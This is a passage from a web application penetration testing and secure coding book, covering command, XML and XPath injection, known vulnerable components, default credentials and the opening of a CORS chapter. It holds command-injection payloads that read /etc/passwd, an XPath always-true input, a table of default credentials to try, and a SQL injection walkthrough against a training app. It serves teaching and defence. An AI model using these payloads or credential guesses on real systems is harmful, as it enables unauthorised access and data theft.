JavaScript encoding is used when the data to encode is inside javascript <script> tags. The function forJavaScript(UNTRUSTED)  can always be used in any JavaScript context, but it can encode unnecessary things. So inside a JavaScript block such as <script></script> tags, the function forJavaScriptBlock(UNTRUSTED)  is more efficient. When JavaScript is inside an attribute such as onmouseover, the function forJavaScriptAttribute (UNTRUSTED)  is the best choice.

CSS Encoding is used when the data to encode is part of CSS. For all CSS cases except a URL, use the function forCssString(UNTRUSTED). In the case of a URL inside of the CSS, use the function forCssUrl(UNTRUSTED).

Use URL Encoding for URL parameters. Either get parameters – value= -- or rest parameters – part of the path. Use function forUriComponent(UNTRUSTED).

Use XML Encoding for XML documents. Use function  forXML(UNTRUSTED) or forXMLContent(UNTRUSTED), depending on context.

[Command injection](#contents.xhtml_sc2_60a)

Command injection refers to a malicious user controlling the input field's value, which can execute an unintended operating system command. This is not as common as the other types of injection but can compromise the server and everything stored on it with the ability pivot to other machines when it occurs.

To test for command injection, look for inputs that appear to be running a system command, such as changing permissions, ping, a directory listing, or even reading a file's contents. Look at these requests to identify user-controllable fields that may be used in a command. These fields can be get parameters, post parameters, part of the URL, a cookie, or a header. Let us assume we have identified an input that runs a ping command to a server, and we can control the server name. So, our input is a URL, IP address, or local server name. In our example, we will input [google.com](https://google.com). This will result in the server running the command:

ping google.com

Then, to test for injection, we add to our input using a special character and another command we wish to run. We will try to run the command:

cat /etc/passwd

The following is a chart of the most common special characters and how they are commonly used in a command injection:

| Special character | Input for the injection | Command sent to server |
| ; | google.com;cat /etc/passwd | ping google.com;cat /etc/passwd |
| &#124; | google.com&#124;cat /etc/passwd | ping google.com&#124;cat /etc/passwd |
| & | google.com&cat /etc/passwd | ping google.com&cat /etc/passwd |
| &#124;&#124; | google.com&#124;&#124;cat /etc/passwd | ping google.com&#124;&#124;cat /etc/passwd |
| && | google.com&&cat /etc/passwd | ping google.com&&cat /etc/passwd |

Table 4.2: Command injection options

In the case where the || is used to connect the commands, the cat command is only executed if the ping fails, and in the && case, the cat command runs only if the ping succeeds.

In Java, command injections almost always come from the use of the Runtime.exec() functionality. Using grep or another search tool to find instances of this in your code can help you test this more efficiently in a gray box style.

To stop command injection, never call the operating system shell unless necessary. Avoid using user input in the command when the operating system shell is needed. Validate input with an allow list if possible. If you cannot use an allow list, encode special characters in user input or parameterize user-received input to the operating system command.

[XML injection](#contents.xhtml_sc2_61a)

This section briefly introduces XML and how to recognize XML tag injection. One type of XML injection is the XML External Entity (XXE) Injection. XXE will be covered in detail in [Chapter 8](#ch08.xhtml), Exploring Vectors with DOS Attack. This section covers the basics so you can recognize XML injection and know where to seek more information.

XML is a versatile and widely used data format that still plays a pivotal role in information exchange and representation. It is designed to structure and store data in a human-readable and machine-readable format. XML uses a set of tags to define the data structure, with each tag specifying the type and meaning of the enclosed content. This flexibility allows XML to represent a wide range of data, from simple configurations to complex documents, making it a fundamental tool for data interchange between different systems and platforms. Its self-descriptive nature and wide adoption in various domains, including web services, document storage, and configuration files, have solidified its importance in modern computing. XML injection is when the malicious user sends a malicious XML document or injects XML tags into the input.

In XML, Document Type Definitions (DTDs) are used to define the structure and rules for an XML document. DTDs can be categorized into two types: internal DTDs and external DTDs.

An internal DTD is defined within the XML document, typically within the <!DOCTYPE> declaration. It is contained within square brackets directly in the XML file. Here is an example:

<?xml version="1.0"?>

<!DOCTYPE root [

<!ELEMENT foobar (foo, bar)>

<!ELEMENT foo (#PCDATA)>

<!ELEMENT bar (#PCDATA)>

<!ATTLIST bar test CDATA ” >

]>

<root>

<foobar>

<foo>This is foo data.</foo>

<bar test =”me”>This is bar data.</bar>

</foobar>

</root>

In this example, we define the structure of the foobar element and its child elements, foo and bar, using an internal DTD. The #PCDATA declaration within the <!ELEMENT> defines that the elements foo and bar can contain parsed character data (text content).

An external DTD is defined in a separate file and referenced in the XML document. Here is how it would look:

<?xml version="1.0"?>

<!DOCTYPE root SYSTEM "example.dtd">

<root>

<foobar>

<foo>This is foo data.</foo>

<bar test=”me”>This is bar data.</bar>

</foobar>

</root>

Consider the DTD file example:

<!ELEMENT root (foobar)>

<!ELEMENT foobar (foo, bar)>

<!ELEMENT foo (#PCDATA)>

<!ELEMENT bar (#PCDATA)>

<!ATTLIST bar test CDATA ” >

In this case, the XML document references an external DTD file using the SYSTEM declaration in the <!DOCTYPE> statement. The structure and rules for the XML document are defined in a separate DTD file. The DTD tells us what is allowed in the XML.

To test for XML tag injection, try to use any of the XML metacharacters: ‘, “, <, >, and &. If these cause errors, the application is very likely to be vulnerable to XML tag injection.

If there is a tag injection, use input validation and allow lists to stop injection attacks.

[XPath injection](#contents.xhtml_sc2_62a)

This section supplies a brief overview of XPath and XPath injection. It focuses on how to tell XPath injection from SQL injection and where to find other resources.

XML Path Language (XPath), is a powerful and widely used technology in XML. XPath supplies a way to navigate and query XML documents to locate specific elements and data. It acts as a path or a querying language for XML, allowing you to pinpoint information within complex XML structures.

XPath uses a set of expressions and functions to traverse the hierarchical structure of XML documents. It can extract data, filter elements, and perform searches within XML content.

Some sample queries are provided in the following table:

| Query | Description |
| //foo | All foo elements |
| //item[1]/bar | the bar element of the first item |
| //item/foo | All foo elements under the item |
| //foo[text()='Second foo'] | Select foo element with text Second foo |

Table 4.3: XPath examples

XPath injection can remarkably resemble SQL injection, but they are not the same. To detect XPath injection, the ‘ is often used to cause an error. Boolean clauses that can be added to make a condition true or false are also like SQL. For example, you might use ‘ or ‘a’=’a to find an always true. Depending on the SQL query, this might also be your injection. So, if something seems like SQL injection but is not precisely working, then maybe it is XPath injection.

A tool called XPath blind explorer can be used similarly to SQLMap to dump an XML database with an XPath injection. It can be downloaded from [https://code.google.com/archive/p/xpath-blind-explorer/downloads](https://code.google.com/archive/p/xpath-blind-explorer/downloads).

To use XPath blind explorer, identify an XPath injection. Identify how the application can verify if the result is true or false. XPath injection is prolonged compared to a lot of SQL injection. So, you may need to wait hours for it to finish. The configuration is simple: provide the URL and parameters with the injection. Then select either keyword true or keyword false and supply the string that shows the condition is met on the web application. Then, choose if the configuration is string-based or integer-based. Refer to the following figure:

![](images/Figure_4.50.png)

Figure 4.50: XPath Blind Explorer

For more information on XPath injection, OWASP has a few relevant articles. Refer to [https://owasp.org/www-community/attacks/XPATH_Injection](https://owasp.org/www-community/attacks/XPATH_Injection) and [https://owasp.org/www-community/attacks/Blind_XPath_Injection](https://owasp.org/www-community/attacks/Blind_XPath_Injection).

[Conclusion](#contents.xhtml_sc2_63a)

Software security requires constant vigilance to protect public web applications and services. This chapter has covered injection attacks, shedding light on the threats of SQL injection, XSS, command injection, XML injection, and XPath injection. After understanding these vulnerabilities and the means to detect and mitigate them, you are better equipped to defend your software against relentless cyber threats. Remember that secure coding is not a mere obligation but a responsibility, and your commitment to implementing the secure coding practices outlined here will protect your users and data and fortify the trust they place in your software.

In the upcoming chapter, we will explore misconfigurations and default values. This will include identifying vulnerable JavaScript libraries, exploiting vulnerable technologies found during reconnaissance, uncovering admin interfaces with default credentials, mitigating risks associated with debugging-enabled environments, exploring exploitable sample apps, and understanding the implications of user agent vulnerabilities.

Join our book’s Discord space

Join the book's Discord Workspace for Latest updates, Offers, Tech happenings around the world, New Release and Sessions with the Authors:

**[https://discord.bpbonline.com](https://discord.bpbonline.com)**

![](images/fm1.png)

# [CHAPTER 5Misconfiguration with Default Values](#contents.xhtml_ch05a)

[Introduction](#contents.xhtml_sc2_64a)

In many cases, the most significant threats do not arise from grand, dramatic breaches but from the seemingly subtle vulnerabilities within the digital infrastructure. This chapter explores misconfigurations and the use of default values, both accidental and intentional. From vulnerable JavaScript libraries and exploitable sample applications to administration interfaces with default credentials, we will uncover these subtle vulnerabilities that can expose your systems. Specific techniques to discover these vulnerabilities and information on stopping these issues from reoccurring in your software development life cycle (SDLC) will be discussed. Ultimately, you will be equipped to navigate the misconfigurations and safeguard your digital assets from potential exploitation.

[Structure](#contents.xhtml_sc2_65a)

This chapter will discuss finding vulnerabilities caused by misconfiguration or use of default values, including:

*   Known vulnerable components
*   Known vulnerable JavaScript libraries
*   User agents and alternative views
*   Default credentials and component configuration

[Objectives](#contents.xhtml_sc2_66a)

By the end of this chapter, you will be familiar with common misconfiguration issues, how to discover them, and how to stop reoccurring misconfiguration issues. You will learn the most common default configuration problems and how to avoid them. We will look at tools used by penetration testers to find vulnerable components and the standard SDLC tools used to stop these issues.

[Known vulnerable components](#contents.xhtml_sc2_67a)

Known vulnerable components refer to any part used by the application that has a published vulnerability. When these vulnerabilities are published, they often include detailed steps for reproducing the issue and sometimes a proof of concept (POC) program that, with a bit of tweaking, can perform the exploit. Known vulnerable JavaScript dependencies are a special subset of known vulnerable components. Known vulnerable JavaScript libraries are covered in a separate section, Known Vulnerable JavaScript Libraries, due to different techniques and tools. This next section will look at manually finding known vulnerable components.

[Manually finding known vulnerable components](#contents.xhtml_sc3_68a)

First, refer to the technologies found during the reconnaissance phase.

Several online databases can be used to search for exploits on these technologies, such as:

*   Vulners ([https://vulners.com/](https://vulners.com/)) is an online security database and search engine that is a valuable resource for security professionals, researchers, and anyone interested in cyber security. Vulners maintains a vast and continuously updated database, including data on vulnerabilities, exploits, patches, and security content. It also offers APIs that enable developers to integrate its security data into their applications, tools, and services.
*   Exploit-DB ([https://www.exploit-db.com/](https://www.exploit-db.com/))  is a well-known online platform and database that serves as a comprehensive resource for security professionals, researchers, and hackers. It primarily supplies information about security vulnerabilities, exploits, and security-related tools. It keeps extensive knowledge about various security vulnerabilities in software, hardware, and web applications. It includes details about the vulnerabilities, their technical descriptions, and relevant proof-of-concepts or working exploits.

The Apache HTTP Server 2.4.52 was found in the reconnaissance phase. So, let us search both Vulners and Exploit-DB to check for vulnerabilities. In Vulners, you select the search type. In this case, we will explore by product and enter the product's name and the version number to see a list of vulnerabilities, as follows:

![](images/Figure_5.1.png)

Figure 5.1: Vulners website

Now, we will search for the same product on exploit-db:

![](images/Figure_5.2.png)

Figure 5.2: Exploit Database website

There are no results. This is because exploit-db only has vulnerabilities with published exploits and POCs, while Vulners reports known vulnerabilities without a published exploit.

Using Kali Linux, you can do an offline command line search of exploit-db using the SearchSploit tool. The Kali command line usage and search and output options are shown as follows:

![](images/Figure_5.3.png)

Figure 5.3: searchsploit command line options

Searching again for Apache HTTP Server 2.4.52 shows that searchsploit does not find any exploits. Refer to the following figure:

![](images/Figure_5.4.png)

Figure 5.4: searchsploit example

This is not surprising as searchsploit uses an offline version of the exploit-db.

Google searches can also be used to pull up lists of published vulnerabilities. To use Google, search for CVE Apache HTTP Server 2.4.52. CVE stands for common vulnerabilities and exposures and is a standardized identifier for a known security vulnerability, allowing security professionals and organizations to reference and track specific vulnerabilities in software and hardware. Our Google search will show results such as the one that follows:

![](images/Figure_5.5.png)

Figure 5.5: Google search for known vulnerabilities

CVE Details ([https://www.cvedetails.com](https://www.cvedetails.com)) is a trusted and well-known site. The first link to the Apache Foundation would also be a sound choice. Generally, look for official sites from MITRE or NVD, cvedetails.com, or the software company’s site.

[Burp extensions and scanners](#contents.xhtml_sc3_69a)

Penetration testers generally use professional vulnerability scanning software such as Nessus and Qualys for vulnerability scanning. These have great results for known network vulnerabilities, operating systems, and infrastructure. If your company gives you access to these tools, use them. You may also want to consider some other options. This section will discuss two options: Vulners Burp Suite Extension and the Nmap vulnerability scan.

A burp suite pro extension called Software Vulnerability Scanner calls back to the Vulners API to tag vulnerabilities from that online database automatically. To install this Extension:

1. Go to the Extender tab.

2. Select BApp Store from the tabs.

3. Search for Vulnerability.

4. Select Software Vulnerability Scanner from the list:

![](images/Figure_5.6.png)

Figure 5.6: BAppStore Software Vulnerability Scanner

Scroll down to the bottom of the description and click Install.

6. Go to the Extensions tab and verify there is a checkmark next to the Software Vulnerability Scanner in the list of Burp Extensions, as shown below:

![](images/Figure_5.7.png)

Figure 5.7: Burp Extensions verify on or off

As you browse the website you are testing using Burp Suite, your requests will automatically be checked for vulnerable components known to the Vulners database. The extension will also put informational findings for software identified without known vulnerabilities.

![](images/Figure_5.8.png)

Figure 5.8: Vulners software identified

Nmap has a free command line vulnerability scanner that can be used. You can use it from the command line in Kali Linux or another machine with the command: nmap -sV –script vuln -p portNumber hostOrIP as shown below:

![](images/Figure_5.9.png)

Figure 5.9: nmap example

The web server was identified as Apache Tomcat 8.5.68, and an extensive list of known vulnerabilities is given to us with links. The items that say *EXPLOIT* have a published exploit we could try to use.

[Exploitation](#contents.xhtml_sc3_70a)

Every known vulnerable component is different in this respect. There can be many variances. This could be in Metasploit, or it could be C code that you may have to compile. You may have to configure and set up the exploit or tweak the code due to differences in the POC and your application. It may be in Python2 and almost impossible to run due to security libraries being depreciated and having to get pip to download older libraries. It may be easy or challenging.

So, to try to exploit one of the known vulnerabilities in Tomcat, select one and read about the exploit. We copy and paste one of the links from the Nmap scan into our browser.

Refer to the following figure:

![](images/Figure_5.10.png)

Figure 5.10: Vulners description of found vulnerability via Nmap

Read through the vulnerability. Decide if you want to try it. This seems easy to test in Burp Suite or in the browser. We take the payload and copy it to our browser. Refer to the following figure:

![](images/Figure_5.11.png)

Figure 5.11: Tomcat exploitation

Trying the exploit resulted in a 400 Bad Request, so does that mean it is vulnerable, not vulnerable, or that we did something wrong? At this point, you should investigate and see if you can find a discussion about the vulnerability, or you may look at a different exploit. When presented with multiple options, it can be challenging to determine the best course of action. This is especially true when it comes to exploiting vulnerabilities in a component. If there are 20 vulnerabilities to select from, evaluating which ones are worth exploiting is crucial based on your time constraints and the potential benefits of each exploit. It is important to note that some exploits may provide access to new parts of the website or a pivot to a shell, while others may not be worth the effort. Therefore, weighing the potential benefits against the time and resources required to execute the exploit, particularly when operating within a tight timeline, is essential.

Even if there are no exploitable vulnerabilities, the best practice is to mention all known vulnerable components in your report with a recommendation to upgrade.

[Stopping the cycle of known vulnerable components](#contents.xhtml_sc3_71a)

The development team should use dependency scanning to stop known vulnerable components from being a constant problem in the application. Dependency scanning involves examining the dependencies and third-party libraries used in software applications to find security vulnerabilities or outdated components, allowing organizations to address potential risks and maintain a secure software supply chain. Its importance lies in mitigating the risk of incorporating vulnerable code into applications, reducing exposure to security threats, and enhancing overall software security. Dependency scanning should be performed regularly, and what regularly is should be defined in the SDLC. The cadence should include checking new code and additions before release to production and a way to check production applications that need to be updated.

There are many different dependency check solutions out there. They are all similar but have some varying features. Generally, all dependency scanners use the National Vulnerability Database (NVD) as a source of information. Most paid tools have other sources from their researchers who watch open-source repositories and find nonpublished security fixes in pull requests.

Snyk is a developer security platform most well-known for its Software Composition Analysis (SCA) tool. Snyk has a free plan that can be used to try it out or for individuals. Snyk is often considered the easiest dependency check tool to use. It can be run on the command line, built into a compile pipeline, or linked into your repositories to have a daily update of changes to your libraries' security statuses. In Java applications, Snyk works by reading the pom file. So, Snyk's assessment is simple. It does not check if you use the vulnerable functions; it simply checks if you included a vulnerable library. This only finds issues with dependencies. So, it would not see a problem with the operating system, a version of Tomcat, etc. Snyk does have a feature that many developers love. It can automatically create a pull request to update insecure libraries. This is convenient, but those libraries should still be tested to ensure no broken code.

One completely free option is the OWASP Dependency-Check tool: [https://jeremylong.github.io/DependencyCheck/index.html](https://jeremylong.github.io/DependencyCheck/index.html). This is an OWASP product that uses the NVD as its data source. There are multiple ways to use this tool, including via command line, Gradle, Maven, Jenkins, and Ant.

We will walk through using this tool via Maven:

1.  First, the tool is configured in your maven pom file.
2.  It will run and create a report when the application is compiled.
3.  The current version is 9.1.0\. We need to add a plugin tag to our pom file that sets up this tool. The plugin reference will include the execution goal check, as shown below:

    <project>

    ...

    <build>

    ...

    <plugins>

    ...

    <plugin>

    <groupId>org.owasp</groupId>

    <artifactId>dependency-check-maven</artifactId>

    <version>9.1.0</version>

    <executions>

    <execution>

    <goals>

    <goal>check</goal>

    </goals>

    </execution>

    </executions>

    </plugin>

    ...

    </plugins>

    ...

    </build>

    ...

    </project>

4.  To run the tool only from the command line, we can run

    mvn org.owasp:dependency-check-maven:9.1.0:check

    which will create an HTML report in the target directory.

    This will also run through any tooling you have configured to compile Maven pom files.

5.  Optionally you can add the configuration tag for failBuildOnCVSS and provide a valid CVSS score to stop the build if anything higher than the provided value is found.

    <configuration>

    <failBuildOnCVSS>8</failBuildOnCVSS>

    </configuration>

Two more security controls should be included if the development uses containers:

*   Golden images for containers are predefined, fully configured, and optimized container images that serve as a blueprint or template for creating new container instances. These images include the necessary software, settings, and dependencies, ensuring consistency and efficiency in container deployment and scaling.
*   Container scanning inspects container images for security vulnerabilities, configuration issues, and compliance violations, helping find and remediate potential risks before deployment. Its importance lies in proactively securing containerized applications and ensuring they are resilient against known threats, reducing the potential for security breaches in a dynamic container environment.

| Note: Keeping JavaScript libraries up to date: These are not generally found by tools like Snyk or Maven Dependency-Check, etc. This is because those Java application tools generally look at the maven pom file and JavaScript libraries are listed in the HTML or JSP pages. Thus, DAST scanners with JavaScript library capabilities or web application penetration testing are the best way to detect vulnerable JavaScript libraries. |

[Known vulnerable JavaScript libraries](#contents.xhtml_sc2_72a)

Vulnerable JavaScript libraries are a prevalent issue in Java web applications. They are being covered separately as several caveats of JavaScript libraries need to be handled differently.

There are several manual ways to get the JavaScript library versions:

*   The wappalyzer extension covered in the Mapping section can be used to get versions.
*   The include of the JavaScript library in the HTML often have the version number.
*   The JavaScript library source code often has the version number.

After finding a library name and a version, check for vulnerabilities using an online database. Snyk is a good choice, or you could use a Google search.

With the habit-helper application, we can use the wappalyzer extension to receive the following information:

![](images/Figure_5.12.png)

Figure 5.12: Wappalyzer example

Under JavaScript libraries, we see jQuery 3.3.1\. Under UI frameworks, bootstrap 3.3.4, which is another JavaScript library, is also listed. We can check for known vulnerabilities using Snyk. We can go to Snyk’s vulnerability database by visiting [https://security.snyk.io/](https://security.snyk.io/). Then, we can search for the packages we have found. Enter jQuery into the search box. A list of vulnerabilities will be returned. Refer to the following figure:

![](images/Figure_5.13.png)

Figure 5.13: Snyk jQuery search

We are looking for one that is just jQuery in the AFFECTS column and nothing else. The type can be used to filter which ones we see. Since npm is for Node.JS, filtering on npm will return JavaScript code vulnerabilities. Refer to the following figure:

![](images/Figure_5.14.png)

Figure 5.14: jQuery Vulnerabilities on npm or Javascript packages

Click on the jQuery in the AFFECTS column to see information on that package. This contains a list of all vulnerabilities on this package and all packages and vulnerabilities they have. Refer to the following figure:

![](images/Figure_5.15.png)

Figure 5.15: jQuery vulnerabilities in SNYK

![](images/Figure_5.16.png)

Figure 5.16: jQuery versions with several known vulnerabilities

So, you can click on the package number or look at the vulnerability list to see what issues might be in the application that is being tested.

The Software Vulnerability Scanner Burp Suite Professional extension does sometimes tag vulnerable JavaScript libraries. There is another Burp Suite Extension that only tags vulnerable JavaScript libraries. This is Retire.JS. You can install Retire.JS similarly to how the Software Vulnerability Scanner was installed. Follow the given steps:

1.  Go to the Extender tab.
2.  Click on the BApp Store.
3.  Search for Retire.JS.
4.  Select it and click on Install.

    ![](images/Figure_5.17.png)

    Figure 5.17: BApp Store Extension installation

5.  On the Extension tab, verify that there is a checkmark next to it in the extensions list.

Retire.JS works passively while you run Burp Suite, listing vulnerabilities in the target or dashboard. While there is overlap between Software Vulnerability Scanner and Retire.JS, neither is wholly contained in the other.

Please refer to the previous section, Exploitation, for information about how to exploit a vulnerable JavaScript library.

[User agents and alternative views](#contents.xhtml_sc2_73a)

Alternate views mean different web application content displayed based on a setting, such as enabling debugging or a different user agent. The most common use case is mobile applications, which often display differently and may call different URLs or backend content. Sometimes, this content may help find a security vulnerability.

[Switching user agents](#contents.xhtml_sc3_74a)

The user agent can be changed with a browser extension such as the user agent switcher or developer tools. It can also be tested using Burp Suite Repeater or Intruder tools.

[Switching the user agent with developer tools](#contents.xhtml_sc4_75a)

First, let us walk through how to change the user agent using developer tools in Chrome:

1. Open the developer tools by clicking the menu represented by three dots, then select more tools in the menu, and from the sub-menu, choose developer tools. Refer to the following figure:

![](images/Figure_5.18.png)

Figure 5.18: Open Developer tools

2. Select the Network condition tab from the lower display:

![](images/Figure_5.19.png)

Figure 5.19: Developer tools user agent string

3. Verify that the Use browser default option is unchecked in the User agent section.

4. Select the drop-down to pick another user agent. Use the selection Custom to create a user agent that is not there:

![](images/Figure_5.20.png)

Figure 5.20: Developer tools user agent list

[User-Agent Switcher Chrome extension](#contents.xhtml_sc4_76a)

The User-Agent Switcher Chrome Extension can be installed from the Chrome store. This extension’s URL is [https://chrome.google.com/webstore/detail/User-Agent-switcher-for-c/djflhoibgkdhcedjiklpkjnoahfmg](https://chrome.google.com/webstore/detail/User-Agent-switcher-for-c/djflhoibgkdhcedjiklpkjnoahfmg). Refer to the following figure:

![](images/Figure_5.21.png)

Figure 5.21: Install User-Agent Switcher

After installing the User-Agent Switcher extension, it can be used by selecting the puzzle piece in the right corner of the browser, which will display a list of extensions. Then, select the User-Agent Switcher. Refer to the following figure:

![](images/Figure_5.22.png)

Figure 5.22: Opening the User-Agent Switcher extension

Then, to change the User-Agent, click on the icon next to the puzzle piece and choose a category from the main menu and a User-Agent selection from the categories sub-menu. Refer to the following figure:

![](images/Figure_5.23.png)

Figure 5.23: User-Agent switch categories

The User-Agent Switcher allows you to configure your categories and user agents. This is done by clicking the puzzle piece icon in the upper right and selecting from the drop-down Manage Extensions. Refer to the following figure:

![](images/Figure_5.24.png)

Figure 5.24: Manage extensions

This will bring up the extensions page in the browser. You can also reach this page by browsing chrome://extensions. Refer to the following figure:

![](images/Figure_5.25.png)

Figure 5.25: Extension list

Next, select the Details button of the User-Agent Switcher extension. This will take you to detailed settings for this extension in the Chrome browser, as shown below:

![](images/Figure_5.26.png)

Figure 5.26: Specific extension instructions

Click the Extension options to open the page from here, allowing you to create, change, and save custom categories and User-Agent strings. An example of creating a User-Agent string with a single quote at the end, we can name SQLI—short for SQL injection—under a submenu Injections is shown below:

![](images/Figure_5.27.png)

Figure 5.27: Adding a SQLI User Agent String

Some common user agents to try for different content are different versions of Chrome, Safari, Edge, Internet Explorer 11, Mobile browsers, Googlebot, Qualys, and McAfee Secure.

The habit-helper application was designed as a Capture The Flag (CTF) training application, which has hidden flags that are revealed when the penetration testing objectives are met. It has a CTF flag that displays when the a specific User-Agent string is used. See if you can find the CTF flag. The application has a visible hint about what User-Agent string to use. This is an exercise for the user.

The user-agent string we have shown is user-controllable, and as such, this field should be tested for injection attacks covered in the previous chapter. Sometimes, client information is logged, and those logs are stored in a database or a file, and then displayed in a web application. So, always include user agent as a possible field for injection attacks.

Let us walk through an example of finding a SQL injection via a User-Agent string.

[SQL injection via user agent](#contents.xhtml_sc4_77a)

In this example, use the habit-helper application. You may change the User-Agent via developer tools, User-Agent Switcher extension, or manually in Burp Suite via intercepting proxy or the repeater tool. The goal is to find the injection and see what new information you can learn about the database, tables, and columns. Try this independently before reading the walkthrough.

If you are ready to read through the walkthrough, then continue below.

This walkthrough uses Burp Suite to intercept a request and send it to the repeater tool. Assuming Burp Suite is already on, we browse the habit-helper login page.

Then, we turn intercept on in Burp Suite by going to the Proxy tab and the intercept subtab. Then, if the button says Intercept is off, click it to turn interception on, as follows:

![](images/Figure_5.28.png)

Figure 5.28: Intercept is off

After clicking the button, the button will change to say Intercept is on, as follows:

![](images/Figure_5.29.png)

Figure 5.29: Intercept has been turned on

From here, go back to the web form and enter user credentials. The request will be captured by the interception proxy, as follows:

![](images/Figure_5.30.png)

Figure 5.30: Intercept the request

Right-clicking on the request will bring up a menu. Select send the request to the repeater, as follows:

![](images/Figure_5.31.png)

Figure 5.31: Send a request to the repeater

The request will be sent to the Repeater tab to be manipulated manually as often as necessary. The request will be displayed on the left side, as shown in the following figure:

![](images/Figure_5.32.png)

Figure 5.32: Send request torepeater

Then, send the request as is to see the response. This is a useful verification step to make sure the request works in the repeater. Next, let us edit the User-Agent string to add a single quote to try to cause an error. Refer to the following figure:

![](images/Figure_5.33.png)

Figure 5.33: Add SQL error triggers

This shows a 500 error is returned, indicating Bad SQL Grammar. Let us look at this in the browser by right-clicking on the request, and when the menu comes up, selecting Request in Browser and then in submenu In the current browser session as follows:

![](images/Figure_5.34.png)

Figure 5.34: Send error message to browser

This will bring up a pop with a URL to copy and paste into the browser.

![](images/Figure_5.35.png)

Figure 5.35: Repeat the request in the browser pop-up

Select Copy, and then in the browser that Burp Suite is configured to use, paste the URL to get the error message shown in the browser as seen in the following figure:

![](images/Figure_5.36.png)

Figure 5.36: Verbose error message

From the exception, we find the logtable table, which inserts the user agent as the second value, followed by the username and the message.

[Debug views](#contents.xhtml_sc4_78a)

A debug view is a view that is found by turning on debugging mode or developer mode in the application. This can be exploited similarly to changing the User-Agent string, but how to turn on the debug view is different.

The debug view could be found on a hidden administration page, by a cookie value, or HTML5 client-side storage value, in JavaScript or HTML, or by guessing a get or post parameter value. It could also be found by finding comments or clues in a database or other files. An example of a debug view will be seen in [Chapter 6](#ch06.xhtml), CORs Exploitation.

[Default credentials and configuration](#contents.xhtml_sc2_79a)

Default component configuration refers to a software component, system, or application's pre-defined credentials, settings, options, and parameters. The manufacturer or developer typically supplies these settings as a starting point for the component's functionality. However, these default configurations are not reviewed and adjusted to align with an organization's security policies and requirements. In that case, they can introduce security vulnerabilities, as attackers often target these default configurations to exploit weaknesses in the system. Therefore, assessing and changing default component configurations is essential to enhance security by minimizing potential attack surfaces and ensuring the system is configured to meet best security practices and standards.

Default configurations should be tested for components found in enumeration, any sample applications deployed, administrative interfaces, and default passwords.

By default, the WordPress administrative dashboard login is located at [http://yourdomain.com/wp-admin](http://yourdomain.com/wp-admin). This allows you to log in to manage WordPress. Noticeable, guessable, or default credentials should be tested for.

The tomcat server page is found at [http://yourdomain.com](http://yourdomain.com) or [http://yourdomain.com/index.jsp](http://yourdomain.com/index.jsp). Examples of applications, documentation, and a manager application are found here. The example applications should be checked for vulnerabilities and the manager application for any obvious, guessable, or default credentials.

Most web servers and components will have similar information available online. The key here is to research the known default locations and credentials.

If you find an administrative login such as the above, here is a short list of default credentials to try:

| Username | Password |
| administrator | <blank> |
| admin | Password |
| admin | admin1234 |
| root | pass123 |
| root | <blank> |
| guest | Guest |
| system | Adminpassword |
| test | 1234 |

Table 5.1: Common default credentials

[Conclusion](#contents.xhtml_sc2_80a)

In cyber security, misconfigurations and default values often prove to be the Achilles' heel of software systems. This chapter has been your guide through the maze of vulnerabilities that stem from misconfigurations and the use of default values. You have learned to recognize and detect common misconfiguration issues, grasped the implications of relying on default configurations, and have been empowered with the knowledge needed to prevent these issues from reoccurring in your SDLC. As you fortify digital defenses and protect against potential exploitation, remember that the small details matter, and the vigilance you exercise in addressing misconfigurations and default values will ultimately decide the resilience of your digital fortresses. This chapter has equipped you with the tools to guard against these subtle but dangerous threats.

The next chapter will cover how to uncover hidden secrets, bypass security controls, and understand the implications of HTML5 client-side storage options like localStorage and sessionStorage. In particular, we will focus on CORS and its exploitation, equipping you with the knowledge to identify its vulnerabilities and defend against them.

# [CHAPTER 6CORS Exploitation](#contents.xhtml_ch06a)

[Introduction](#contents.xhtml_sc2_81a)

In the ever-evolving web development environment, the client-side code forms the bedrock of modern web applications. It is a place where secrets and security controls are entrusted to browsers, and data is stored within the confines of localStorage and sessionStorage. Yet, lurking in this seemingly innocent space is a powerful and often misunderstood vulnerability called Cross-Origin Requests (CORS) exploitation. This chapter peels back the layers of client-side code security, exposing client-side code secrets, revealing the art of bypassing security controls, and shedding light on the subtle dangers of localStorage and sessionStorage. However, the heart of our exploration is CORS, where you will understand when it becomes a vulnerability and discover the techniques employed to exploit it. Through this journey, we aim to equip you with the knowledge and best practices to secure your client-side code, ensuring that your web applications are still resilient against emerging threats in the digital age.

[Structure](#contents.xhtml_sc2_82a)

This chapter will discuss the following topics:

*   Client-side code
*   Client-side storage
*   Cross-Origin Resource Sharing

[Objectives](#contents.xhtml_sc2_83a)

By the end of this chapter, you will be familiar with finding client-side code secrets and bypassing client-side security controls. You will learn the security implications of the HTML5 client-side storage options localStorage and sessionStorage. We will look at CORS and understand when it can cause a vulnerability and how it can be exploited. Secure coding guidance for CORS and other client-side issues will also be discussed.

[Client-side code](#contents.xhtml_sc2_84a)

Client-side code refers to any code that runs in the browser. This is typically JavaScript, but it can be jQuery, Angular, or something else. The following subsections will look at different attack vectors involving client-side code. First, we will look at finding secret information in client-side code that can be used to further an attack. Then, we will discuss client-side code controls and how to bypass them.

[Finding secrets](#contents.xhtml_sc3_85a)

Secrets refer to anything that web application users should not know. This includes encryption keys, passwords for third-party services, application programming interface (API) keys, implementation details, URLs to administrative interfaces, or details about backend APIs, among other things. Common ways to find secrets are to look for keywords in HTML and JavaScript, although nothing beats reading every line of client-side code in the application. Refrain from reading 3rd party libraries. Secrets from 3rd party libraries would be known vulnerabilities as a rule, so finding them would not be necessary. Standard terms to look for in JavaScript are secret, token, key, password API, apikey, todo, debug, and bug. If the client-side is done in angular or node, look for env.js files, which often store interesting information. Also, look for swagger files and WSDL files that may supply details about an API. WSDL can usually be found by putting WSDL after the service URL. Swagger has several different URLs, including looking for the swagger.json file in any directory, swagger-ui directory, or API-docs directory.

One way to search for secrets is to use the Burp Suite Search command. Let us do that in the amazing-myths-3 application to look for any secret information that might be given away. Follow the given steps:

1.  First, go to the Burp menu tab, then click Search.

    ![](images/Figure_6.1.png)

    Figure 6.1: Burp Suite Search option

2.  When a search comes up, you can limit the search by HTTP requests or responses or by which tools to search in Burp Suite, etc. Use the search form field to search for a relevant term. Refer to the following figure:

    ![](images/Figure_6.2.png)

    Figure 6.2: Burp Suite Search menu

    Generally, we look for leaked secrets in the files returned from the server, so we only search the response headers and body.

3.  We can limit the tools to avoid duplicates. For example, if you have been using the repeater tool for manual testing, removing it will keep a match for each repeater request from showing in your results. An example with results is as follows:

    ![](images/Figure_6.3.png)

    Figure 6.3: Burp Suite Search results

